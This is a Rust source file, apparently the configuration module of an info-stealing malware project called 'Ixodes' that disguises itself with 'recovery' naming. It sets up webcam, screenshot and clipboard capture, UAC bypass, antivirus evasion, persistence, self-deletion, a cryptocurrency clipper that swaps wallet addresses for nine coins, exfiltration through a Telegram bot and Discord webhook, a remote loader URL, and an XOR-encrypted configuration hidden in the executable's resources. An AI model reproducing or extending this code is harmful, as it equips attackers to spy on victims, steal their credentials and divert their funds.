use crate::recovery::config::LoaderConfig;
use crate::recovery::defaults::*;
use crate::recovery::task::RecoveryCategory;
use base64::{Engine as _, engine::general_purpose::STANDARD};
use once_cell::sync::Lazy;
use std::collections::HashSet;
use std::env;
use std::str::FromStr;
use tracing::{info, warn};

static GLOBAL_RECOVERY_CONTROL: Lazy<RecoveryControl> = Lazy::new(RecoveryControl::from_env);

#[derive(Debug)]
pub struct RecoveryControl {
    allowed_categories: Option<HashSet<RecoveryCategory>>,
    artifact_key: Option<Vec<u8>>,
    #[cfg(feature = "screenshot")]
    capture_screenshots: bool,
    #[cfg(feature = "webcam")]
    capture_webcams: bool,
    #[cfg(feature = "clipboard")]
    capture_clipboard: bool,
    #[cfg(feature = "uac")]
    uac_bypass_enabled: bool,
    #[cfg(feature = "evasion")]
    evasion_enabled: bool,
    #[cfg(feature = "clipper")]
    clipper_enabled: bool,
    #[cfg(feature = "melt")]
    melt_enabled: bool,
    #[cfg(feature = "clipper")]
    btc_address: Option<String>,
    #[cfg(feature = "clipper")]
    eth_address: Option<String>,
    #[cfg(feature = "clipper")]
    ltc_address: Option<String>,
    #[cfg(feature = "clipper")]
    xmr_address: Option<String>,
    #[cfg(feature = "clipper")]
    doge_address: Option<String>,
    #[cfg(feature = "clipper")]
    dash_address: Option<String>,
    #[cfg(feature = "clipper")]
    sol_address: Option<String>,
    #[cfg(feature = "clipper")]
    trx_address: Option<String>,
    #[cfg(feature = "clipper")]
    ada_address: Option<String>,
    telegram_token: Option<String>,
    telegram_chat_id: Option<String>,
    discord_webhook: Option<String>,
    loader_url: Option<String>,
    proxy_server: Option<String>,
    #[cfg(feature = "persistence")]
    persistence_enabled: bool,
    #[allow(dead_code)]
    pump_size_mb: u32,
    blocked_countries: Option<HashSet<String>>,
    custom_extensions: Option<HashSet<String>>,
    custom_keywords: Option<HashSet<String>>,
}

impl RecoveryControl {
    pub fn global() -> &'static RecoveryControl {
        &GLOBAL_RECOVERY_CONTROL
    }



    pub fn artifact_key(&self) -> Option<&[u8]> {
        self.artifact_key.as_deref()
    }

    #[cfg(feature = "screenshot")]
    pub fn capture_screenshots(&self) -> bool {
        self.capture_screenshots
    }

    #[cfg(feature = "webcam")]
    pub fn capture_webcams(&self) -> bool {
        self.capture_webcams
    }

    #[cfg(feature = "clipboard")]
    pub fn capture_clipboard(&self) -> bool {
        self.capture_clipboard
    }

    #[cfg(feature = "uac")]
    pub fn uac_bypass_enabled(&self) -> bool {
        self.uac_bypass_enabled
    }

    #[cfg(feature = "evasion")]
    pub fn evasion_enabled(&self) -> bool {
        self.evasion_enabled
    }

    #[cfg(feature = "clipper")]
    pub fn clipper_enabled(&self) -> bool {
        self.clipper_enabled
    }

    #[cfg(feature = "melt")]
    pub fn melt_enabled(&self) -> bool {
        self.melt_enabled
    }

    #[cfg(feature = "clipper")]
    pub fn btc_address(&self) -> Option<&String> {
        self.btc_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn eth_address(&self) -> Option<&String> {
        self.eth_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn ltc_address(&self) -> Option<&String> {
        self.ltc_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn xmr_address(&self) -> Option<&String> {
        self.xmr_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn doge_address(&self) -> Option<&String> {
        self.doge_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn dash_address(&self) -> Option<&String> {
        self.dash_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn sol_address(&self) -> Option<&String> {
        self.sol_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn trx_address(&self) -> Option<&String> {
        self.trx_address.as_ref()
    }

    #[cfg(feature = "clipper")]
    pub fn ada_address(&self) -> Option<&String> {
        self.ada_address.as_ref()
    }

    pub fn telegram_token(&self) -> Option<&String> {
        self.telegram_token.as_ref()
    }

    pub fn telegram_chat_id(&self) -> Option<&String> {
        self.telegram_chat_id.as_ref()
    }

    pub fn discord_webhook(&self) -> Option<&String> {
        self.discord_webhook.as_ref()
    }

    pub fn loader_url(&self) -> Option<&String> {
        self.loader_url.as_ref()
    }

    pub fn proxy_server(&self) -> Option<&String> {
        self.proxy_server.as_ref()
    }

    #[cfg(feature = "persistence")]
    pub fn persistence_enabled(&self) -> bool {
        self.persistence_enabled
    }



    pub fn blocked_countries(&self) -> Option<&HashSet<String>> {
        self.blocked_countries.as_ref()
    }

    pub fn custom_extensions(&self) -> Option<&HashSet<String>> {
        self.custom_extensions.as_ref()
    }

    pub fn custom_keywords(&self) -> Option<&HashSet<String>> {
        self.custom_keywords.as_ref()
    }

    pub fn allows_category(&self, category: RecoveryCategory) -> bool {
        match &self.allowed_categories {
            Some(allowed) => allowed.contains(&category),
            None => true, // If no restriction is set, allow all
        }
    }

    fn from_env() -> Self {
        // 1. Try to load embedded config (Resource or Overlay)
        if let Some(config) = load_embedded_config() {
            info!("loaded embedded configuration from binary");
            return Self::from_loader_config(config);
        }

        // 2. Fallback to Env / Defaults
        info!("no embedded configuration found, using environment/defaults");
        
        let allowed_categories = env::var("IXODES_ENABLED_CATEGORIES")
            .ok()
            .and_then(|value| parse_categories(&value))
            .or_else(|| default_categories());

        if let Some(categories) = allowed_categories.as_ref() {
            info!(
                "restricting recovery to {} categories",
                categories
                    .iter()
                    .map(|category| category.to_string())
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }

        let artifact_key = env::var("IXODES_ARTIFACT_KEY")
            .ok()
            .and_then(|value| decode_artifact_key(&value))
            .or_else(|| DEFAULT_ARTIFACT_KEY.and_then(decode_artifact_key));

        if artifact_key.is_some() {
            info!("artifact encryption enabled");
        }

        #[cfg(feature = "screenshot")]
        let capture_screenshots =
            parse_flag("IXODES_CAPTURE_SCREENSHOTS").unwrap_or(DEFAULT_CAPTURE_SCREENSHOTS);
        #[cfg(feature = "webcam")]
        let capture_webcams =
            parse_flag("IXODES_CAPTURE_WEBCAM").unwrap_or(DEFAULT_CAPTURE_WEBCAMS);
        #[cfg(feature = "clipboard")]
        let capture_clipboard =
            parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
        #[cfg(feature = "persistence")]
        let persistence_enabled = parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
        #[cfg(feature = "uac")]
        let uac_bypass_enabled = parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
        #[cfg(feature = "evasion")]
        let evasion_enabled = parse_flag("IXODES_EVASION").unwrap_or(DEFAULT_EVASION_ENABLED);
        #[cfg(feature = "clipper")]
        let clipper_enabled = parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
        #[cfg(feature = "melt")]
        let melt_enabled = parse_flag("IXODES_MELT").unwrap_or(DEFAULT_MELT_ENABLED);

        #[cfg(feature = "clipper")]
        let btc_address = env::var("IXODES_BTC_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_BTC_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let eth_address = env::var("IXODES_ETH_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_ETH_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let ltc_address = env::var("IXODES_LTC_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_LTC_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let xmr_address = env::var("IXODES_XMR_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_XMR_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let doge_address = env::var("IXODES_DOGE_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_DOGE_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let dash_address = env::var("IXODES_DASH_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_DASH_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let sol_address = env::var("IXODES_SOL_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_SOL_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let trx_address = env::var("IXODES_TRX_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_TRX_ADDRESS.map(String::from));
        #[cfg(feature = "clipper")]
        let ada_address = env::var("IXODES_ADA_ADDRESS")
            .ok()
            .or_else(|| DEFAULT_ADA_ADDRESS.map(String::from));

        let pump_size_mb = parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);

        let blocked_countries = env::var("IXODES_BLOCKED_COUNTRIES")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_blocked_countries());

        let custom_extensions = env::var("IXODES_CUSTOM_EXTENSIONS")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_custom_extensions());

        let custom_keywords = env::var("IXODES_CUSTOM_KEYWORDS")
            .ok()
            .and_then(|v| parse_string_list(&v))
            .or_else(|| default_custom_keywords());

        let telegram_token = env::var("IXODES_TELEGRAM_TOKEN")
            .ok()
            .or_else(|| DEFAULT_TELEGRAM_TOKEN.map(String::from));
        let telegram_chat_id = env::var("IXODES_CHAT_ID")
            .ok()
            .or_else(|| DEFAULT_TELEGRAM_CHAT_ID.map(String::from));
        let discord_webhook = env::var("IXODES_DISCORD_WEBHOOK")
            .ok()
            .or_else(|| DEFAULT_DISCORD_WEBHOOK.map(String::from));

        let loader_url = env::var("IXODES_LOADER_URL")
            .ok()
            .or_else(|| DEFAULT_LOADER_URL.map(String::from));

        let proxy_server = env::var("IXODES_PROXY_SERVER")
            .ok()
            .or_else(|| DEFAULT_PROXY_SERVER.map(String::from));

        RecoveryControl {
            allowed_categories,
            artifact_key,
            #[cfg(feature = "screenshot")]
            capture_screenshots,
            #[cfg(feature = "webcam")]
            capture_webcams,
            #[cfg(feature = "clipboard")]
            capture_clipboard,
            #[cfg(feature = "uac")]
            uac_bypass_enabled,
            #[cfg(feature = "evasion")]
            evasion_enabled,
            #[cfg(feature = "clipper")]
            clipper_enabled,
            #[cfg(feature = "melt")]
            melt_enabled,
            #[cfg(feature = "clipper")]
            btc_address,
            #[cfg(feature = "clipper")]
            eth_address,
            #[cfg(feature = "clipper")]
            ltc_address,
            #[cfg(feature = "clipper")]
            xmr_address,
            #[cfg(feature = "clipper")]
            doge_address,
            #[cfg(feature = "clipper")]
            dash_address,
            #[cfg(feature = "clipper")]
            sol_address,
            #[cfg(feature = "clipper")]
            trx_address,
            #[cfg(feature = "clipper")]
            ada_address,
            telegram_token,
            telegram_chat_id,
            discord_webhook,
            loader_url,
            proxy_server,
            #[cfg(feature = "persistence")]
            persistence_enabled,
            pump_size_mb,
            blocked_countries,
            custom_extensions,
            custom_keywords,
        }
    }

    fn from_loader_config(config: LoaderConfig) -> Self {
        let allowed_categories = config.allowed_categories.map(|cats| {
            cats.iter()
                .filter_map(|s| RecoveryCategory::from_str(s).ok())
                .collect()
        });

        let artifact_key = config
            .artifact_key
            .as_deref()
            .and_then(decode_artifact_key);

        RecoveryControl {
            allowed_categories,
            artifact_key,
            #[cfg(feature = "screenshot")]
            capture_screenshots: config.capture_screenshots.unwrap_or(false),
            #[cfg(feature = "webcam")]
            capture_webcams: config.capture_webcams.unwrap_or(false),
            #[cfg(feature = "clipboard")]
            capture_clipboard: config.capture_clipboard.unwrap_or(false),
            #[cfg(feature = "uac")]
            uac_bypass_enabled: config.uac_bypass_enabled.unwrap_or(false),
            #[cfg(feature = "evasion")]
            evasion_enabled: config.evasion_enabled.unwrap_or(true),
            #[cfg(feature = "clipper")]
            clipper_enabled: config.clipper_enabled.unwrap_or(false),
            #[cfg(feature = "melt")]
            melt_enabled: config.melt_enabled.unwrap_or(true),
            #[cfg(feature = "clipper")]
            btc_address: config.btc_address,
            #[cfg(feature = "clipper")]
            eth_address: config.eth_address,
            #[cfg(feature = "clipper")]
            ltc_address: config.ltc_address,
            #[cfg(feature = "clipper")]
            xmr_address: config.xmr_address,
            #[cfg(feature = "clipper")]
            doge_address: config.doge_address,
            #[cfg(feature = "clipper")]
            dash_address: config.dash_address,
            #[cfg(feature = "clipper")]
            sol_address: config.sol_address,
            #[cfg(feature = "clipper")]
            trx_address: config.trx_address,
            #[cfg(feature = "clipper")]
            ada_address: config.ada_address,
            telegram_token: config.telegram_token,
            telegram_chat_id: config.telegram_chat_id,
            discord_webhook: config.discord_webhook,
            loader_url: config.loader_url,
            proxy_server: config.proxy_server,
            #[cfg(feature = "persistence")]
            persistence_enabled: config.persistence_enabled.unwrap_or(false),
            pump_size_mb: config.pump_size_mb.unwrap_or(0),
            blocked_countries: config.blocked_countries,
            custom_extensions: config.custom_extensions,
            custom_keywords: config.custom_keywords,
        }
    }
}


use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;

#[repr(C)]
struct IMAGE_RESOURCE_DIRECTORY {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    number_of_named_entries: u16,
    number_of_id_entries: u16,
}

#[repr(C)]
struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    name_or_id: u32,
    offset_to_data: u32,
}

#[repr(C)]
struct IMAGE_RESOURCE_DATA_ENTRY {
    offset_to_data: u32,
    size: u32,
    code_page: u32,
    reserved: u32,
}

#[cfg(not(target_os = "windows"))]
fn load_resource_config() -> Option<LoaderConfig> { None }

#[cfg(target_os = "windows")]
fn load_resource_config() -> Option<LoaderConfig> {
    unsafe {
        let base = GetModuleHandleW(None).ok()?.0 as *const u8;
        if base.is_null() { return None; }

        let dos_header = &*(base as *const IMAGE_DOS_HEADER);
        if dos_header.e_magic != 0x5A4D { return None; }


        if dos_header.e_magic != 0x5A4D { return None; }

        let nt_headers = &*(base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        if nt_headers.signature != 0x00004550 { return None; }

        let res_dir_va = nt_headers.optional_header.data_directory[2].virtual_address;
        if res_dir_va == 0 { return None; }

        let root_dir_ptr = base.add(res_dir_va as usize);
        let root_dir = &*(root_dir_ptr as *const IMAGE_RESOURCE_DIRECTORY);
        
        let entries_ptr = root_dir_ptr.add(std::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>()) as *const IMAGE_RESOURCE_DIRECTORY_ENTRY;
        let total_entries = root_dir.number_of_named_entries + root_dir.number_of_id_entries;

        let mut type_entry: Option<&IMAGE_RESOURCE_DIRECTORY_ENTRY> = None;
        for i in 0..total_entries {
            let entry = &*entries_ptr.add(i as usize);
            if entry.name_or_id == 10 {
                type_entry = Some(entry);
                break;
            }
        }
        
        let type_entry = type_entry?;
        if type_entry.offset_to_data & 0x80000000 == 0 { return None; }

        let type_dir_offset = type_entry.offset_to_data & 0x7FFFFFFF;
        let type_dir_ptr = root_dir_ptr.add(type_dir_offset as usize);
        let type_dir = &*(type_dir_ptr as *const IMAGE_RESOURCE_DIRECTORY);
        
        let name_entries_ptr = type_dir_ptr.add(std::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>()) as *const IMAGE_RESOURCE_DIRECTORY_ENTRY;
        let total_name_entries = type_dir.number_of_named_entries + type_dir.number_of_id_entries;
        
        let mut name_entry: Option<&IMAGE_RESOURCE_DIRECTORY_ENTRY> = None;
        for i in 0..total_name_entries {
            let entry = &*name_entries_ptr.add(i as usize);
            if entry.name_or_id == 101 {
                name_entry = Some(entry);
                break;
            }
        }

        let name_entry = name_entry?;
        if name_entry.offset_to_data & 0x80000000 == 0 { return None; }

        let lang_dir_offset = name_entry.offset_to_data & 0x7FFFFFFF;
        let lang_dir_ptr = root_dir_ptr.add(lang_dir_offset as usize);
        let lang_dir = &*(lang_dir_ptr as *const IMAGE_RESOURCE_DIRECTORY);
        
        let lang_entries_ptr = lang_dir_ptr.add(std::mem::size_of::<IMAGE_RESOURCE_DIRECTORY>()) as *const IMAGE_RESOURCE_DIRECTORY_ENTRY;
        if lang_dir.number_of_named_entries + lang_dir.number_of_id_entries == 0 { return None; }
        
        let lang_entry = &*lang_entries_ptr;
        if lang_entry.offset_to_data & 0x80000000 != 0 { return None; }

        let data_offset = lang_entry.offset_to_data;
        let data_entry_ptr = root_dir_ptr.add(data_offset as usize) as *const IMAGE_RESOURCE_DATA_ENTRY;
        let data_entry = &*data_entry_ptr;

        let resource_data_ptr = base.add(data_entry.offset_to_data as usize);
        let resource_size = data_entry.size as usize;

        let slice = std::slice::from_raw_parts(resource_data_ptr, resource_size);
        
        if slice.len() <= 32 {
            warn!("resource config is too short to contain key + payload");
            return None;
        }

        let (key, encrypted_data) = slice.split_at(32);
        let decrypted = xor_codec(encrypted_data, key);

        match serde_json::from_slice::<LoaderConfig>(&decrypted) {
            Ok(config) => Some(config),
            Err(e) => {
                warn!("failed to parse resource config: {}", e);
                None
            }
        }
    }
}

fn xor_codec(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut output = data.to_vec();
    if key.is_empty() { return output; }
    
    for (i, byte) in output.iter_mut().enumerate() {
        *byte ^= key[i % key.len()];
    }
    output
}

fn default_categories() -> Option<HashSet<RecoveryCategory>> {
    DEFAULT_ALLOWED_CATEGORIES.map(|categories| categories.iter().copied().collect())
}

fn parse_u32(key: &str) -> Option<u32> {
    env::var(key).ok().and_then(|v| v.parse().ok())
}

fn default_blocked_countries() -> Option<HashSet<String>> {
    DEFAULT_BLOCKED_COUNTRIES.map(|countries| countries.iter().map(|s| s.to_string()).collect())
}

fn default_custom_extensions() -> Option<HashSet<String>> {
    DEFAULT_CUSTOM_EXTENSIONS.map(|items| items.iter().map(|s| s.to_string()).collect())
}

fn default_custom_keywords() -> Option<HashSet<String>> {
    DEFAULT_CUSTOM_KEYWORDS.map(|items| items.iter().map(|s| s.to_string()).collect())
}

fn decode_artifact_key(value: &str) -> Option<Vec<u8>> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return None;
    }
    match STANDARD.decode(trimmed) {
        Ok(bytes) => {
            if bytes.len() != 32 {
                warn!(
                    "artifact encryption key must be 32 bytes (base64); got {} bytes",
                    bytes.len()
                );
                None
            } else {
                Some(bytes)
            }
        }
        Err(err) => {
            warn!(
                error = ?err,
                "failed to decode artifact encryption key"
            );
            None
        }
    }
}

fn parse_string_list(value: &str) -> Option<HashSet<String>> {
    let mut set = HashSet::new();
    for segment in value.split(',') {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        set.insert(trimmed.to_string());
    }
    if set.is_empty() { None } else { Some(set) }
}

fn parse_categories(value: &str) -> Option<HashSet<RecoveryCategory>> {
    let mut set = HashSet::new();
    for segment in value.split(',') {
        let trimmed = segment.trim();
        if trimmed.is_empty() {
            continue;
        }
        match RecoveryCategory::from_str(trimmed) {
            Ok(category) => {
                set.insert(category);
            }
            Err(err) => {
                warn!("skipping invalid category filter {trimmed}: {err}");
            }
        }
    }
    if set.is_empty() { None } else { Some(set) }
}

#[cfg(any(
    feature = "screenshot",
    feature = "webcam",
    feature = "clipboard",
    feature = "persistence",
    feature = "uac",
    feature = "evasion",
    feature = "clipper",
    feature = "melt"
))]
fn parse_flag(key: &str) -> Option<bool> {
    env::var(key).ok().map(|value| {
        matches!(
            value.trim().to_ascii_lowercase().as_str(),
            "1" | "true" | "yes" | "on"
        )
    })
}
